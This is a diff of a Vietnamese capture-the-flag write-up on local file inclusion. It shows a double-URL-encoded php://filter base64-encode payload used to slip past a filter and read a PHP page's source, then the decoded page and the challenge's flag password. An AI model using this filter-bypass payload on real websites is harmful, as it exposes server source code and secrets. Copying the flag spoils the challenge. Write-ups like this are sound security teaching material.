@@ -32,7 +32,7 @@ Tiếp theo chúng ta sẽ sử dụng ``php://filte`` với base64 encoding. Pa
     
  Sau 2 lần encode thì url của nó sẽ trông như thế này:  
  
-    php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv  
+    php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dcv  
     
   - Tiếp tục đổi ``.`` thành ``%252E``  
 
@@ -41,19 +41,19 @@ Tiếp theo chúng ta sẽ sử dụng ``php://filte`` với base64 encoding. Pa
 ![image](https://user-images.githubusercontent.com/125866921/229978101-e75089b4-15a3-4724-9432-7872ce3b3e8c.png)
 
 Ta nhận được:  
-
+    
     PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIENWPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8Pz0gJGNvbmZbJ2dsb2JhbF9zdHlsZSddID8+CiAgICA8bmF2PgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1ob21lIj5Ib21lPC9hPgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jdiIgY2xhc3M9ImFjdGl2ZSI+Q1Y8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICA8L25hdj4KICAgIDxoMT48Pz0gJGNvbmZbJ2NvbnRhY3QnXVsnZmlyc3RuYW1lJ10gPz4gPD89ICRjb25mWydjb250YWN0J11bJ2xhc3RuYW1lJ10gPz48L2gxPgogICAgPGgzPlByb2Zlc3Npb25hbCBkb2VyPC9oMz4KICAgIDw/PSAkY29uZlsnY3YnXVsnZ2VuZGVyJ10gPyAiTWFsZSIgOiAiRmVtYWxlIiA/Pjxicj4KICAgIDw/PSBkYXRlKCdZL20vZCcsICRjb25mWydjdiddWydiaXJ0aCddKSA/PiAoPD89IGRhdGUoJ1knKS1kYXRlKCdZJywgJGNvbmZbJ2N2J11bJ2JpcnRoJ10pID8+KQogICAgPD9waHAKICAgICAgZm9yZWFjaCAoJGNvbmZbJ2N2J11bJ2pvYnMnXSBhcyAkam9iKSB7CiAgICA/PgogICAgICA8ZGl2IGNsYXNzPSJqb2IiPgogICAgICAgIDxoND48Pz0gJGpvYlsndGl0bGUnXSA/PiAtIDxzcGFuIGNsYXNzPSJkYXRlIj48Pz0gJGpvYlsnZGF0ZSddID8+PC9zcGFuPjwvaDQ+CiAgICAgIDwvZGl2PgogICAgPD9waHAKICAgICAgfQogICAgPz4KICA8L2JvZHk+CjwvaHRtbD4K
     
 Encode những dòng trên bằng base64 ta được:  
 
     <?php include("conf.inc.php"); ?>
-  <!DOCTYPE html>
-  <html>
-  <head>
+    <!DOCTYPE html>
+    <html>
+    <head>
     <meta charset="utf-8">
     <title>J. Smith - CV</title>
-  </head>
-  <body>
+    </head>
+    <body>
     <?= $conf['global_style'] ?>
     <nav>
       <a href="index.php?page=home">Home</a>
@@ -143,5 +143,7 @@ Encode những dòng trên bằng base64 ta được:
       }
       </style>'
     ];
+
+Đọc phần decode:  
 
     password: Th1sIsTh3Fl4g!
